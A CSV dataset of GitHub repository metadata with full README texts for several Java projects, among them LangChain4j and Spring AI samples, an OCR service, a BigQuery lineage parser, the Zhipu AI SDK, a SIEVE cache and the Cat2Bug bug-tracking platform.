repo,branch,readme,releases_count,open_issues_count,branches_count,license,pulls_count
ThomasVitale/langchain4j-spring-boot,main,"# LangChain4j Spring Boot

This project brings [LangChain4j](https://github.com/langchain4j) support in Spring Boot
to build AI and LLM-powered applications. It provides integrations with LLM services
and vector stores, as well as tools, chains, and AI services.

Using the starter projects in this repository, you gain the following advantages over
using the vanilla LangChain4j libraries in Spring Boot:

* Autoconfiguration and unified configuration properties for models and vector stores
* HTTP infrastructure with RestClient, WebClient, and Jackson for all integrations
* Built-in observability with Micrometer, including LLM-specific metrics and traces
* Dev services with Docker Compose and Testcontainers for models and vector stores
* Service bindings for automatic connection configuration when running on Kubernetes.

## 🚀&nbsp; Quick Start

### Pre-Requisites

* Java 17+
* Docker/Podman
* [Spring CLI](https://docs.spring.io/spring-cli/reference/installation.html)

### Getting Started

Using the Spring CLI, you can easily bootstrap a new Spring Boot application with LangChain4j support.

First, add the LangChain4j Spring Boot catalog providing the project templates.

```shell
spring project-catalog add langchain4j https://github.com/ThomasVitale/langchain4j-spring-boot
```

Then, create a new Spring Boot project for building an LLM Applications with LangChain4j and Ollama.

```shell
spring boot new myapp langchain4j-chat-ollama
```

Finally, navigate to the `myapp` folder and run the Spring Boot application. The first time you run it,
it will take a while to download the Ollama container image used as a dev service based on the Testcontainers
Spring Boot integration.

```shell
cd myapp
./mvnw spring-boot:run
```

You can now call the application that will use Ollama and _llama3_ to generate a text response.
This example uses [httpie](https://httpie.io) to send HTTP requests.

```shell
http :8080/ai/chat message==""What is the capital of Italy?""
```

## 🦜 Models

### OpenAI

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-openai-spring-boot-starter:0.9.0'
```

Configuration:

```yaml
langchain4j:
  open-ai:
    client:
      api-key: ${OPENAI_API_KEY}
```

Example:

```java
@RestController
class ChatController {
    private final ChatLanguageModel chatLanguageModel;

    ChatController(ChatLanguageModel chatLanguageModel) {
        this.chatLanguageModel = chatLanguageModel;
    }

    @GetMapping(""/ai/chat"")
    String chat(@RequestParam(defaultValue = ""What did Gandalf say to the Balrog?"") String message) {
        return chatLanguageModel.generate(message);
    }
}
```

### Ollama

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-ollama-spring-boot-starter:0.9.0'
```

Configuration:

```yaml
langchain4j:
  ollama:
    chat:
      model: llama3
```

Example:

```java
@RestController
class ChatController {
    private final ChatLanguageModel chatLanguageModel;

    ChatController(ChatLanguageModel chatLanguageModel) {
        this.chatLanguageModel = chatLanguageModel;
    }

    @GetMapping(""/ai/chat"")
    String chat(@RequestParam(defaultValue = ""What did Gandalf say to the Balrog?"") String message) {
        return chatLanguageModel.generate(message);
    }
}
```

## 🫙 Vector Stores

### Chroma

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-chroma-spring-boot-starter:0.9.0'
```

Example:

```java
class ChromaDataIngestor {
    private final ChromaEmbeddingStore embeddingStore;
    private final EmbeddingModel embeddingModel;

    ChatController(ChromaEmbeddingStore embeddingStore, EmbeddingModel embeddingModel) {
        this.embeddingStore = embeddingStore;
        this.embeddingModel = embeddingModel;
    }

    public void ingest(List<Document> documents) {
        EmbeddingStoreIngestor ingestor = EmbeddingStoreIngestor.builder()
                .embeddingStore(embeddingStore)
                .embeddingModel(embeddingModel)
                .documentSplitter(recursive(300, 0))
                .build();
        ingestor.ingest(documents);
    }
}
```

### Weaviate

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-weaviate-spring-boot-starter:0.9.0'
```

Example:

```java
class WeaviateDataIngestor {
    private final WeaviateEmbeddingStore embeddingStore;
    private final EmbeddingModel embeddingModel;

    ChatController(WeaviateEmbeddingStore embeddingStore, EmbeddingModel embeddingModel) {
        this.embeddingStore = embeddingStore;
        this.embeddingModel = embeddingModel;
    }

    public void ingest(List<Document> documents) {
        EmbeddingStoreIngestor ingestor = EmbeddingStoreIngestor.builder()
                .embeddingStore(embeddingStore)
                .embeddingModel(embeddingModel)
                .documentSplitter(recursive(300, 0))
                .build();
        ingestor.ingest(documents);
    }
}
```

## 🌟 Examples

Check these [examples](https://github.com/ThomasVitale/llm-apps-java-langchain4j) to see LangChain4j and Spring Boot in action.

## 🛡️&nbsp; Security

The security process for reporting vulnerabilities is described in [SECURITY.md](SECURITY.md).

## 🖊️&nbsp; License

This project is licensed under the **Apache License 2.0**. See [LICENSE](LICENSE) for more information.
",16,4,1,apache-2.0,5.0
Laurc2004/ocr-ddd,master-cloud,"# OCR 项目 :sparkles:

## 📚 项目简介 :sunrise:

本项目是一个结合了DDD（领域驱动设计）架构理念的Java-Python跨界之作，旨在提供精准高效的OCR服务。

利用Python的[Paddle OCR](https://github.com/PaddlePaddle/PaddleOCR)库进行文字识别，该库以其高准确率和对复杂场景的适应性著称，能够轻松识别包括180°翻转在内的多种文本形式。

与此同时，Java部分采用了DDD架构，不仅加深了业务理解，也提升了代码的可维护性和扩展性。

前端则选用了Ant Design Pro，为用户提供流畅的交互体验。

前端代码仓库同样开源，欢迎您查阅和贡献：

- **前端项目地址**：[Laurc2004/ocr-frontend](https://github.com/Laurc2004/ocr-frontend) 使用Ant Design Pro构建，为用户带来极致的Web体验。

## 🔄 调用流程与功能说明 :gear:

### 💻 单体版本

- **公众号集成**：用户通过公众号发送图片或图片链接，根据引导即可启动OCR服务。
- **Python OCR引擎**：图片信息转发至Python后端，调用Paddle OCR进行文字识别。
- **Java处理逻辑**：识别结果被Java后端反序列化，提取关键信息并暂存于Redis（时效5分钟），利用线程池与Redission实现并发控制与流量限制。

### 🌐 微服务版本

- **Web界面操作**：用户访问Web界面，关注公众号后获取验证码登录，享受更丰富的功能。
- **用户认证与注册**：通过Spring Security实现安全验证，新用户自动注册。
- **多样化识别选项**：支持上传文件或输入URL，策略模式与工厂模式灵活选择处理策略，预留扩展接口如Base64识别。
- **结果输出定制**：提供专业模式输出详细坐标信息及文本识别分数，非专业模式则快速提取特定类型信息（如英文、车牌、身份证号等）。
- **支付与订单管理**：集成微信支付，采用EventBus解耦支付回调逻辑，配合定时任务处理异常订单。（前端暂时未做，本人微信商户到期）

## 🎨 功能展示 :framed_picture:

- **体验地址**：[在线体验](http://lixp.online:9888/)

- **截图预览**：
单体：
<img src=""https://github.com/Laurc2004/ocr-ddd/assets/119660750/6e9a1c79-c792-4b6d-870a-09333161afeb"" width=""400"">




微服务：





<img src=""https://github.com/Laurc2004/ocr-ddd/assets/119660750/144790bb-698d-4a5f-addd-701667df94a4"" width=""400"">

![image](https://github.com/Laurc2004/ocr-ddd/assets/119660750/4b65ddd4-9aae-4f26-a35f-19897c32ec19)

- **测试图片**：[示例图片](https://img0.pcauto.com.cn/pcauto/1812/25/14171817_paizhao.jpg)

## 🛠️ 软件架构 :wrench:

遵循DDD原则，项目分为四层：

- **触发层**：http、消息队列、定时任务等
- **应用层**：协调业务逻辑
- **领域层**：核心业务规则与实体
- **基础设施层**：数据库、缓存等

## 🔧 技术栈亮点 :key:

### Java & 中间件

- **Spring生态**：Spring Boot, MVC, Security
- **网络与数据**：Okhttp, Jackson, Mybatis, MySQL, Redis
- **API管理与文档**：Knife4j
- **开发辅助**：Lombok
- **消息传递**：EventBus（Guava）
- **配置与服务发现**：Nacos
- **流量控制**：Sentinel
- **分布式锁**：Redission

### Python

- **轻量级Web框架**：Flask
- **OCR库**：PaddleOCR

### 前端技术

- **React + Ant Design Pro**：构建现代Web应用
- **ArkTs**（规划中）：面向鸿蒙应用的TypeScript库
- **ReactNative**（规划中）：面向移动端

## 📖 安装部署教程 :book:

[1.0.0简易版教程](https://github.com/Laurc2004/ocr-ddd/wiki/%E5%AE%89%E8%A3%85%E5%92%8C%E8%BF%90%E8%A1%8C%E6%95%99%E7%A8%8B(1.0.0%E7%AE%80%E6%98%93%E7%89%88))
[2.0.0微服务版教程](https://github.com/Laurc2004/ocr-ddd/wiki/%E5%AE%89%E8%A3%85%E5%92%8C%E8%BF%90%E8%A1%8C%E6%95%99%E7%A8%8B(2.0.0%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%89%88))

欢迎Star🌟 和Fork该项目，您的反馈与贡献是我们不断进步的动力！
",0,0,3,apache-2.0,0.0
arconia-io/arconia,main,"# Arconia

Arconia is a framework to build SaaS, multitenant applications using Java and Spring Boot.

<img src=""arconia-logo.png"" alt=""The Arconia logo"" height=""250px"" />

## 🚀&nbsp; Quick Start

### Pre-Requisites

* Java 17+
* [Spring CLI](https://docs.spring.io/spring-cli/reference/installation.html)

### Getting Started

Using the Spring CLI, you can easily bootstrap a new Spring Boot application using the Arconia framework.

First, add the Arconia Spring catalog providing the project templates.

```shell
spring project-catalog add arconia https://github.com/arconia-io/arconia
```

Then, create a new Spring Boot project for building a multitenant web application.

```shell
spring boot new myapp arconia-web
```

Finally, navigate to the `myapp` folder and run the Spring Boot application.

```shell
cd myapp
./mvnw spring-boot:run
```

You can now call the application as one of the valid tenants (`dukes` or `beans`).
This example uses [httpie](https://httpie.io) to send HTTP requests.

```shell
http :8080/ X-TenantId:dukes
```

## 🌟 Examples

Check these [examples](https://github.com/arconia-io/arconia-samples) to see Arconia and Spring Boot in action.

## 🛡️&nbsp; Security

The security process for reporting vulnerabilities is described in [SECURITY.md](SECURITY.md).

## 🖊️&nbsp; License

This project is licensed under the **Apache License 2.0**. See [LICENSE](LICENSE) for more information.
",5,9,1,apache-2.0,0.0
iot/jetbra,main,,0,0,1,mit,1.0
borjavb/bq-lineage-tool,master,"# Bq-Lineage-tool


Bq-lineage tool is a column level lineage parser for BigQuery using ZetaSQL. This 
parser started as a fork of this [project by google](https://github.com/GoogleCloudPlatform/bigquery-data-lineage), but it
has been heavily modified to cover the whole bigquery syntax offered by ZetaSQL. The
output of this parser is a DAG of the columns used in a query from sources to outputs, including
auxiliary fields that could be used as part of filters or other operations that don't result in the
materialisation of a field. 



From any arbitrary BigQuery query, you will get the following outputs:
- `output_columns`: The columns that are part of the output of the query, with all the input 
  columns references that were needed to produce them.
- `joins`: List of joins used in the query, considering the columns used for the join
- `aggregations`: List of columns used for aggregations
- `filters`: List of columns used for filtering
- `other_used_columns`: Any other columns used across the query, like order by
- `selected_tables`: A list of all the tables that were selected in the query.
- `Type`: The type of sql statement `{SELECT, CREATE_VIEW, MERGE...}`

![image](./flow.png)


## What can this parser do?

* It's schema aware. This means that a query like `SELECT * FROM table` will generate a DAG
  with all the output columns of `table`, and not just a single node with a `*` symbol.
* It prunes unused columns. This means that for a query like `WITH base AS (SELECT * FROM
  table) SELECT aColumn FROM base` the output DAG will only contain the column `aColumn` and not the
  whole input table.
* It covers pretty much all the BigQuery syntax, including:
    * `WITH` (CTE) clauses
    * Subqueries
    * `UNNEST`-based `JOINS`
    * `STRUCTS` and `ARRAYS`
    * `JOINS`
    * Analytical functions (`QUALIFY`, `LAG`/`LEAD`, `WINDOWS` etc.)
    * Map aliases to original columns
    * `JSON` functions
    * Access to the `PATH` used in `JSON` functions (`JSON_EXTRACT(field,""$.path.to.field"")`)
    * Access to the literals used in the query, for example, in a `WHERE` clause
    * Access to fields that are not part of the output columns of the table (fields only used in a
      `WHERE` clause)
    * `PIVOT` and `UNPIVOT` transformations
    * `GROUP BY GROUPING SETS`, `ROLLUP` and `CUBE`
    * `UDF` and temporary functions
    * Usage of parameters @param
    * Recursive CTEs
    * It parses `SELECTS`, `CREATE {VIEWS}` and `MERGE` statements
    * It automatically infers internal BQ fields like `_TABLE_SUFFIX`

## What can't it do?

* This parser won't work with procedural SQL. For example, it will fail trying to parse a 
  DECLARE or SET operations.
* This parser won't read the logic within UDF functions. It only checks inputs and outputs.
* ZetaSQL might not be up-to-date with the latest BigQuery features, so if there's something
  super new, it will involve either waiting for ZetaSQL to be updated, or going deep into
  ZetaSQL to build the feature.
* It doesn't work while trying to parse queries accessing `INFORMATION_SCHEMA`-type of tables. I
  guess we could bypass this by using a different type of access, but never when through it deeply.
* This parser won't build the DAG of multiple queries. It only parses a single query at a
  time. To build a full dag of your dbt project, for example, you can use libraries like
  `networkx` to connect the edges from the output of this parser.
* Parse SQL syntax that is not supported by ZetaSQL (for example the + operator in Snowflake joins)
* When doing a `SELECT count(*) FROM table`, the output of the parser would act as if no columns
  were selected. This could be subject to interpretation: should all the columns of the input
  `table` be marked as used? Or should the output be an empty list because this query doesn't
  care about any specific column or number of columns?
* Unexpected bugs - even though this parser has been texted over more than 7000 SQL queries, 
  there still might be some edge cases that suddenly are not covered. SQL is hard.
* It doesn't work with `TVF` (Table Valued Functions) - although ZetaSQL parses it, the output 
  won't show the columns of the TVF.
* Automatically infer UDFs - they have to be defined as part of the script that is going to be parsed.

## How to use
The folder `/src/test/examples` has multiple examples of how to use this parser. The main caveat 
relies on how to build the catalog that ZetaSQL needs. Depending on how much you want the parser 
to automate the whole process for you, there are three different methods to build a catalog, 
from the ""let the parser to it for me"" to ""I'll build the catalog myself""

- `/src/test/examples/BigQuerySqlParserBQSchemaTest.java` shows how to rely on the metadata of 
  BiGQuery to build the catalog. To use this method the user has to be authenticated with gcloud.
  Note that there's zero data access/movement in this operation. The only access that is being 
  done is directly to the metadata of the tables, and only to the tables that are being used in 
  the parsed query, i.e., this parser won't scan the whole database. The access is done using 
  the bigquery API. You can use  `gcloud auth application-default login` to authenticate. 
- `/src/test/examples/BigQuerySqlParserLocalSchemaTest.java` shows how to use local json files 
  to build the schema. `/src/test/resources/schemas/` has examples of these files. They are 
  exact copies of the metadata information you can get 
[through the API](https://cloud.google.com/bigquery/docs/reference/rest/v2/tables). Note that 
  this is basically what we automate with the previous method.
- `/src/test/examples/ASTExplorerTest.java` Shows an example on how can manually create your own 
  catalog using ZetaSQL methods/constructors and feed it into the parser. 

### Example
The following example uses the first method to build the catalog -  it will use the bigquery API 
to request the metadata of the tables used in the query.
```java
    BigQueryZetaSqlSchemaLoader schemaLoader =
        new BigQueryZetaSqlSchemaLoader(
            BigQueryTableLoadService.usingServiceFactory(
                BigQueryServiceFactory.defaultFactory()
          )
        );

    ZetaSQLResolver parser = new ZetaSQLResolver(schemaLoader);
    
    String sql = """"""
        SELECT
              word,
              SUM(word_count) AS count
            FROM
              `bigquery-public-data.samples.shakespeare`
            WHERE
              word LIKE ""%raisin%""
            GROUP BY
              word;
        """""";
    
    ResolvedNodeExtended table = parser.extractLineage(sql);
    OutputLineage printer = new OutputLineage();
    printer.toYaml(table, ""test"", true);
```
Output:
```
name: ""test""
output_columns:
- name: ""word""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
- name: ""count""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word_count""
other_used_columns:
- name: ""_word_""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
    literal_value:
    - ""%raisin%""
type: ""select""
selected_tables:
- ""bigquery-public-data.samples.shakespeare""
```

### Notes
- This parser **never** accesses the data of the tables or any bigquery instance. The only 
  connection needed is to the metadata of the tables.
- The parser will use a default project+dataset if these are missing in the reference tables of 
  a project. Please refer to `src/main/java/com/borjav/data/options/Options.java` in case you 
  need to set a specific project.
- When using UDFs, they also have to be defined within the code. The parser won't be able to 
  resolve them if they are not defined in the code. Please refer to 
  `src/test/resources/sql/benchmark/udf.yaml`.
",0,1,1,mit,0.0
MetaGLM/zhipuai-sdk-java-v4,main,"# 智谱大模型开放接口SDK

智谱[开放平台](http://open.bigmodel.cn/howuse/platformintroduced)大模型接口Java SDK（Big Model API SDK in
Java），让开发者更便捷的调用智谱开放API

## 简介
- <font color=""red"">**java sdk仍在开发测试阶段，有bug请留言联系**</font>
- 对所有接口进行了类型封装，无需查阅API文档即可完成接入

## 安装

- 运行环境：JDK1.8+
- maven坐标
```
        <dependency>
            <groupId>cn.bigmodel.openapi</groupId>
            <artifactId>oapi-java-sdk</artifactId>
            <version>release-V4-2.3.0</version>
        </dependency>
```
### 依赖信息

```text
okhttp_3.14.9
java-jwt_4.2.2
jackson_2.11.3
retrofit2_2.9.0 
```
## 使用
- 调用流程：
    1. 使用APIKey创建Client
    2. 调用Client对应的成员方法
- [V4Test.java](src/test/java/com/zhipu/oapi/V4Test.java)有完整的demo示例，请替换自己的ApiKey进行测试


> SDK提供了ClientV4的构造器，此方法可以在创建Client时进行配置，可配置项如下：

 
- enableTokenCache：是否开启token缓存，开启后会缓存token，减少token请求次数
- networkConfig：设置连接超时、读取超时、写入超时、ping间隔、ping超时时间
- connectionPool：设置连接池

``` 
String API_SECRET_KEY = ""your api"";
private static final ClientV4 client = new ClientV4.Builder(API_SECRET_KEY) 
        .enableTokenCache()
        .networkConfig(30, 10, 10, 10, TimeUnit.SECONDS)
        .connectionPool(new okhttp3.ConnectionPool(8, 1, TimeUnit.SECONDS))
        .build();
 
```

### spring Controller 示例
```java
package com.zhipu.controller;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.wd.common.core.domain.R;
import com.zhipu.oapi.ClientV4;
import com.zhipu.oapi.service.v4.deserialize.MessageDeserializeFactory;
import com.zhipu.oapi.service.v4.model.ChatCompletionRequest;
import com.zhipu.oapi.service.v4.model.ModelApiResponse;
import com.zhipu.oapi.service.v4.model.ModelData;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.concurrent.TimeUnit;

@RestController
public class TestController {

    private final static Logger logger = LoggerFactory.getLogger(TestController.class);
    private static final String API_SECRET_KEY = System.getProperty(""ZHIPUAI_API_KEY"");

    private static final ClientV4 client = new ClientV4.Builder(API_SECRET_KEY)
            .networkConfig(300, 100, 100, 100, TimeUnit.SECONDS)
            .connectionPool(new okhttp3.ConnectionPool(8, 1, TimeUnit.SECONDS))
            .build();
    private static final ObjectMapper mapper = MessageDeserializeFactory.defaultObjectMapper();


    @RequestMapping(""/test"")
    public R<ModelData> test(@RequestBody ChatCompletionRequest chatCompletionRequest) {
        ModelApiResponse sseModelApiResp = client.invokeModelApi(chatCompletionRequest);

        return R.ok(sseModelApiResp.getData());
    }
}

```


## 升级内容

#### release-V4-2.3.0
- 知识库业务
- 智能助手业务
- 增加embedding-3支持

#### release-V4-2.2.0
- 重构代码
- 高级检索接口
- codegeex接口
- 视频生成功能


#### release-V4-2.1.0
- 增加拓展报文序列化工具类
- 增加测试样例
- 修改为使用api key鉴权
- 统一通信客户端
- 删除部分序列化框架依赖
- 增加批处理API

#### release-V4-2.0.2
- readTimeOut时间设置为300s
- 修改测试demo中apiKey命名


#### release-V4-2.0.1
- 统一client4构造apikey入参
- 延长token过期时间
",0,5,11,mit,13.0
linux-china/sieve-cache,main,"SIEVE Cache in Java
===================

SIEVE is simpler than LRU with following features:

* Simplicity: easy to implement and can be easily integrated into existing systems.
* Efficiency: achieves state-of-the-art efficiency on skewed workloads.
* Cache Primitive: facilitates the design of advanced eviction algorithms.

![How it works](how-it-works.png)

# Get started
 
* Add dependency to `pom.xml`:

```xml
<dependency>
    <groupId>org.mvnsearch</groupId>
    <artifactId>sieve-cache</artifactId>
    <version>0.1.0</version>
</dependency>
```
* Create a cache instance and use it:

```
   Cache<String> cache = new SieveCache<>();
   cache.put(""nick"", ""Jackie"");
   System.out.println(cache.get(""nick""));
```

# References
        
* SIEVE: https://cachemon.github.io/SIEVE-website/
* SIEVE is simpler than LRU: https://cachemon.github.io/SIEVE-website/blog/2023/12/17/sieve-is-simpler-than-lru/",1,1,1,apache-2.0,0.0
ThomasVitale/llm-apps-java-langchain4j,main,"# LLM Applications with Java, Spring Boot, and LangChain4j

Samples showing how to build Java applications powered by Generative AI and LLMs
using the [LangChain4j Spring Boot](https://github.com/ThomasVitale/langchain4j-spring-boot) extension.

## Pre-Requisites

* Java 17+
* Docker/Podman
* [OpenAI](http://platform.openai.com) API Key (optional)
* [Ollama](https://ollama.ai) (optional)

## Content

### 1. Chat Models

| Project                                                                                                                   | Description                           |
|---------------------------------------------------------------------------------------------------------------------------|---------------------------------------|
| [chat-models-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/01-chat-models/chat-models-ollama) | Text generation with LLMs via Ollama. |
| [chat-models-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/01-chat-models/chat-models-openai) | Text generation with LLMs via OpenAI. |

### 2. Prompts

| Project                                                                                                                            | Description                                                         |
|------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------|
| [prompts-basics-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-basics-ollama)        | Prompting using simple text with LLMs via Ollama.                   |
| [prompts-basics-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-basics-openai)        | Prompting using simple text with LLMs via OpenAI.                   |
| [prompts-messages-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-messages-ollama)    | Prompting using structured messages and roles with LLMs via Ollama. |
| [prompts-messages-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-messages-openai)    | Prompting using structured messages and roles with LLMs via OpenAI. |
| [prompts-templates-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-templates-ollama)  | Prompting using templates with LLMs via Ollama.                     |
| [prompts-templates-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/02-prompts/prompts-templates-openai)  | Prompting using templates with LLMs via OpenAI.                     |

### 3. Output Parsers

| Project                                                                                                                            | Description                                                                  |
|------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------|
| [output-parsers-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/03-output-parsers/output-parsers-ollama) | Parsing the LLM output as structured objects (Beans, Map, List) via Ollama.  |
| [output-parsers-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/03-output-parsers/output-parsers-openai) | Parsing the LLM output as structured objects (Beans, Map, List) via Open AI. |

### 4. Embedding Models

| Project                                                                                                                                    | Description                                              |
|--------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------|
| [embedding-models-ollama](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/04-embedding-models/embedding-models-ollama) | Vector transformation (embeddings) with LLMs via Ollama. |
| [embedding-models-openai](https://github.com/ThomasVitale/llm-apps-java-langchain4j/tree/main/04-embedding-models/embedding-models-openai)   | Vector transformation (embeddings) with LLMs via OpenAI. |

### 5. Document Readers

_Coming soon_

### 6. Document Transformers

_Coming soon_

### 7. Document Writers

_Coming soon_

### 8. Vector Stores

_Coming soon_

### 9. Tools

_Coming soon_

### 10. Image Models

_Coming soon_

## References and Additional Resources

* [LangChain4j](https://github.com/langchain4j)
",0,0,1,apache-2.0,0.0
cat2bug/cat2bug-platform,master,"<div align=""center""><img src=""readme/images/logo.png"" style=""width: 300px;"" /></div>
<h1 align=""center"" style=""margin: 30px 0 30px; font-weight: bold;"">Cat2Bug-Platform v0.4.2</h1>
<h4 align=""center"">轻量化智能BUG管理平台</h4>

## 平台简介

Cat2Bug-Platform是一套永久免费开源的Bug管理平台，可以完全私有化部署，它利用目前比较流行的AI大数据模型技术作为辅助，快速提升软件管理的质量，我们将毫无保留给个人及团体免费使用。
它的使用人群锁定个人或中小型软件开发团队，Cat2Bug的理念是免去了项目管理中各种重度管理，让个人或团队可以快速上手，把控软件质量。
平台采用JAVA+VUE前后台分离模式开发，支持在各系统平台部署使用。

## 内置功能

1.  团队管理：管理团队中的项目、成员。
2.  项目管理：管理项目中的缺陷、成员。
3.  用例管理：管理测试用例
4.  缺陷管理：管理BUG、需求、任务。
5.  交付物管理：维护项目中的可交付物品。
6.  报告管理：显示团队、项目、测试用例、缺陷、交付物等的相关数据指标。
7.  API管理：用于管理API接口密钥
8.  文档管理：留备项目中所用到的各种文档
9.  通知管理：发送系统业务通知到系统内部、邮件、钉钉等平台中。

## 最新版本更新说明

当前最新版本是0.4.2

* 在测试用例、缺陷、交付物、报告、文档、通知模块新增悬浮菜单;
* 新建缺陷时添加缓存上一次选项功能
* 缺陷中添加excel导入导出功能;
* 添加数据库自动升级功能；
* 修复系统功能BUG;

## 特色

* 开源私有化AI+BUG系统部署;
* 通过AI技术自动生成测试用例并录入到系统，解决费时费力录入用例的痛点;
* 已测试平台为生态中心，衍生多种缺陷监控测试框架，可以一站式解决软件生产运维中的诸多痛点；
* 自主研发报告模版，可轻松、快速、动态的生成项目所需管理及交付文档，较免管理人员编写文档的时间成本;
* 专注于软件的缺陷的跟踪管理，简单直接，即开即用，减少学习成本；

## 在线体验

- 体验账号：demo
- 体验密码：123456

演示地址：[https://www.cat2bug.com:8022](https://www.cat2bug.com:8022)

## 关联产品

| 名称                                                       | 类型       | 说明                                                                |
|----------------------------------------------------------|----------|:------------------------------------------------------------------|
| [Cat2Bug-JUnit](https://gitee.com/cat2bug/cat2bug-junit) | 单元测试框架   | 自动化单元测试框架，目前可以自动扫描Controller接口，随机提供参数测试，并将测试报告提交到Cat2Bug-Platform |
| [Cat2Bug-JLog](https://gitee.com/cat2bug/cat2bug-jlog)   | 错误日志采集框架 | 获取项目中的异常日志，并将日志报告提交到Cat2Bug-Platform                              |

## 系统架构

![系统架构](readme/images/cat2bug-platform-framework.png)

## 技术选型

1. 系统环境

* Java EE 11
* Servlet 3.0
* Apache Maven 3

2. 主框架

* Spring Boot 2.2.x
* Spring Framework 5.2.x
* Spring Security 5.2.x

3. 持久层

* Apache MyBatis 3.5.x
* Hibernate Validation 6.0.x
* Alibaba Druid 1.2.x

4. 视图层

* Vue 2.6.x
* Axios 0.21.x
* Element 2.15.x

## 模块

````
--cat2bug-platform
------|----cat2bug-platform-admin       # 主程序模块
------|----cat2bug-platform-ai          # 人工智能模块
------|----cat2bug-platform-im          # 通讯模块
------|----cat2bug-platform-api         # Open API模块
------|----cat2bug-platform-common      # 通用模块
------|----cat2bug-platform-framework   # 系统框架
------|----cat2bug-platform-generator   # 代码生成
------|----cat2bug-platform-quartz      # 定时任务
------|----cat2bug-platform-system      # 业务模块
------|----cat2bug-platform-ui          # 前端VUE工程
------|----sql                          # 数据库文件
------|----readme                       # 文档
````

## 部署

### 手动命令行部署

手动部署需要提前安装Java 11环境，并下载cat2bug-platform发行版程序，执行命令如下：

```shell
nohup java -jar cat2bug-platform-0.4.2.jar>/dev/null 2>&1 &
```

### Docker单容器部署

以下提供的是Docker官网容器化的部署方案，执行命令如下：

```docker
docker run -it -d -p 8022:8022 --name cat2bug-platform cat2bug/cat2bug-platform:latest
```

由于Docker官网访问不稳定，我们还提供了国内镜像下载的方案：

```docker
docker run -it -d -p 8022:8022 --name cat2bug-platform qyzw-docker.pkg.coding.net/cat2bug/cat2bug-platform/single:latest
```

部署成功后，打开浏览器访问[http://127.0.0.1:8022](http://127.0.0.1:8022),在登陆页面自行注册账号登陆使用即可。

注意：系统管理员账号：admin    密码：cat2bug，此账号用于管理注册用户。

此部署方式为单容器最精简方式部署，数据库默认采用嵌入式H2，多用于小型或临时性项目的缺陷管理，如需Mysql或多容器部署方案，请查看[官网文档](https://www.cat2bug.com/download/cat2bug-platform/#%E9%83%A8%E7%BD%B2)。

## 演示图

<table>
    <tr>
        <td><img src=""readme/images/1.png""></td>
        <td><img src=""readme/images/2.png""></td>
    </tr>
    <tr>
        <td><img src=""readme/images/3.png""></td>
        <td><img src=""readme/images/4.png""></td>
    </tr>
    <tr>
        <td><img src=""readme/images/5.png""></td>
        <td><img src=""readme/images/6.png""></td>
    </tr>
    <tr>
        <td><img src=""readme/images/7.png""></td>
        <td><img src=""readme/images/8.png""></td>
    </tr>
</table>

## 未来计划

目前Cat2Bug还在持续成长中，后续我们将在测试工具、自动化、AI几个方向持续投入，完善平台的功能。2024计划如下：

* cat2bug-platform: 功能叠加，完善系统统计管理功能；
* cat2bug-app：提供移动端APP；
* cat2bug-spring-junit：提供Java Spring自动化单元测试(已完成)；
* cat2bug-cloud：cat2bug云平台的建设；

## Cat2Bug交流群

| QQ群： [731462000](https://qm.qq.com/cgi-bin/qm/qr?k=G_vJa478flcFo_1ohJxNYD0mRKafQ7I1&jump_from=webapi&authKey=EL0KrLpnjYWqNN9YXTVksNlNFrV9DHYyPMx2RVOhXqLzfnmc+Oz8oQ38aBOGx90t) | 微信群：Cat2Bug                                                                 |
|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------|
| <img src=""./readme/images/qq.png"" style=""width: 150px; height: 150px;"">                                                                                                        | <img src=""./readme/images/wechat.png"" style=""width: 150px; height: 150px;""> |
",0,4,1,mit,0.0
ThomasVitale/llm-apps-java-spring-ai,main,"# LLM and AI-Infused Applications with Java and Spring AI

Samples showing how to build Java applications powered by Generative AI and Large Language Models (LLMs) using [Spring AI](https://docs.spring.io/spring-ai/reference/).

## Pre-Requisites

* Java 23
* Docker/Podman

## Content

### 0. Use Cases

| Project                                                                                                                                 | Description                                                                 |
|-----------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------|
| [chatbot](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/00-use-cases/chatbot)                                       | Chatbot using LLMs via Ollama.                                              |
| [question-answering](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/00-use-cases/question-answering)                 | Question answering with documents (RAG) using LLMs via Ollama and PGVector. |
| [semantic-search](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/00-use-cases/semantic-search)                       | Semantic search using LLMs via Ollama and PGVector.                         |
| [structured-data-extraction](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/00-use-cases/structured-data-extraction) | Structured data extraction using LLMs via Ollama.                           |
